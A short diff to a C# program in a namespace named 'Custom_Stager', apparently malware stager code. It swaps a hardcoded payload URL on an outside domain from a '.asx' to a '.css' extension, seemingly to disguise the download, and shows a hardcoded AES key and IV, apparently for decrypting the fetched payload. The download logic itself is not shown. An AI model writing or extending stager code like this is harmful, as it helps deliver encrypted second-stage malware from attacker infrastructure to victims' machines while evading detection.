@@ -12,7 +12,7 @@ namespace Custom_Stager
 {
     class Program
     {
-        private static string url = "https://www.administrative.cc/d2fc1b6a458f.asx";
+        private static string url = "https://www.administrative.cc/d2fc1b6a458f.css";
         private static string AESKey = "9ae0c8e048d89fb3";
         private static string AESIV = "789ca1a73299c6e0";
 
